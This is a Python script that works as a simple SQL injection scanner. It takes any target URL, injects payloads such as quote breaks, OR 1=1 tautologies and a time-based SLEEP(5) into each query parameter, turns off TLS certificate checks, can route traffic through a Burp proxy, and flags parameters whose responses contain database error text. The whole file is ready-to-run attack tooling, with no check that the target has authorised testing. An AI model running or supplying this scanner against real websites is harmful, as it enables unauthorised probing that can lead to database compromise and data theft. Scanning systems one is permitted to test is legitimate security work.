import requests
import urllib.parse
import sys

# Suppress SSL warnings (Burp uses self-signed cert)
requests.packages.urllib3.disable_warnings()

# === Payloads and Error Patterns ===
sql_payloads = [
    "'",
    "'--",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "' AND SLEEP(5)--",
    "' OR '1'='1' /*"
]

sql_errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "syntax error",
    "fatal error",
    "sqlite error"
]

# === User Input ===
target_url = input("[?] Enter the full target URL (must contain at least one parameter): ").strip()
proxy_choice = input("[?] Route traffic through Burp proxy? (y/N): ").strip().lower()

# Parse URL
parsed_url = urllib.parse.urlparse(target_url)
query = parsed_url.query

if not query:
    print("[-] Invalid URL. It must contain at least one query parameter (e.g., ?id=1)")
    sys.exit(1)

params = dict(urllib.parse.parse_qsl(query))
base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"

# Use Burp proxy if selected
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
} if proxy_choice == 'y' else {}

print("\n[+] Testing for SQL injection on:", target_url)

# === Injection Test ===
vulnerable = False

for param in params:
    original_value = params[param]

    for payload in sql_payloads:
        # Inject payload
        test_params = params.copy()
        test_params[param] = original_value + payload

        full_url = base_url + "?" + urllib.parse.urlencode(test_params)

        try:
            response = requests.get(full_url, proxies=proxies, verify=False, timeout=10)
            content = response.text.lower()

            print("[+] Tested:", full_url)

            for error in sql_errors:
                if error in content:
                    print("\n[!] SQL Injection vulnerability detected!")
                    print("[!] Parameter:", param)
                    print("[!] Payload:", payload)
                    print("[!] URL:", full_url)
                    vulnerable = True
                    break

            if vulnerable:
                break

        except requests.exceptions.RequestException as e:
            print("[-] Request failed:", e)

    if vulnerable:
        break

if not vulnerable:
    print("\n[✓] No SQL injection patterns detected.")
